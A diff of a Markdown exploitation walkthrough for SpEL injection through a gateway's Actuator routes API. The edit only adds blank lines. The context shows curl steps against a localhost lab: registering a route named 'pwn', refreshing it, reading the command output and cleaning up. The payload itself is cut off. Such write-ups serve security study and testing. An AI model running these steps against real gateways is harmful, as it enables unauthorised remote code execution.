@@ -42,6 +42,7 @@ An attacker can craft a new route definition containing malicious SpEL expressio
 ## Exploitation Walkthrough
 
 ### 1. Register a Malicious Route with SpEL Injection
+
 Send a POST request to create a route with an injected SpEL command:
 
 ```bash
@@ -63,6 +64,7 @@ curl -i -s -X POST 'http://localhost:8125/actuator/gateway/routes/pwn' \
 The gateway responds with `HTTP/1.1 201 Created`.
 
 ### 2. Trigger Route Refresh
+
 Trigger the gateway Actuator to evaluate the new route and execute the payload:
 
 ```bash
@@ -70,6 +72,7 @@ curl -i -s -X POST 'http://localhost:8125/actuator/gateway/refresh'
 ```
 
 ### 3. Retrieve Output & Cleanup
+
 Inspect the created route to view the command execution results reflected in the response header:
 
 ```bash
@@ -77,6 +80,7 @@ curl -s 'http://localhost:8125/actuator/gateway/routes/pwn' | jq .
 ```
 
 To delete the injected route and clean up:
+
 ```bash
 curl -s -X DELETE 'http://localhost:8125/actuator/gateway/routes/pwn'
 curl -s -X POST 'http://localhost:8125/actuator/gateway/refresh'
